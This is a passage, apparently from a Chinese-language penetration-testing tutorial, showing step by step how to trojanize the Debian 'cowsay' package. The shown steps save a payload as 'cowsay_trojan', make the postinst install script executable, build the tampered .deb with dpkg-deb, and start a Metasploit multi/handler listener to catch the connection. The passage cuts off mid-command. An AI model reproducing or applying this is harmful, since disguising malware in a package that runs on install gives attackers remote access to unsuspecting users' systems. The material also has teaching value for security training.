  \ 287 bytes\nSaved as: /root/cowsay/usr/games/cowsay_trojan\nroot@kali:~/cowsay/DEBIAN#\n\
  ```\n\n- 7. 在构建新包之前，我们需要使用 chmod 命令使 postinst 文件可执行。构建包时，我们使用带有 --build 选项的 dpkg-deb\
  \ 命令，后跟程序源目录的路径：\n\n```\nroot@kali:~/cowsay/DEBIAN# chmod 755 postinst\nroot@kali:~/cowsay/DEBIAN#\
  \ dpkg-deb --build /root/cowsay/\ndpkg-deb: building package 'cowsay' in\n'/root/cowsay.deb'.\n\
  root@kali:~/cowsay/DEBIAN#\n```\n\n- 8. 为了测试我们的木马，我们将在新的终端窗口中使用带有 -x 选项的 msfconsole\
  \ 启动一个监听器，该选项允许我们将字符串指定为控制台命令：\n\n```\nroot@kali:~# msfconsole -q -x 'use exploit/multi/handler;\
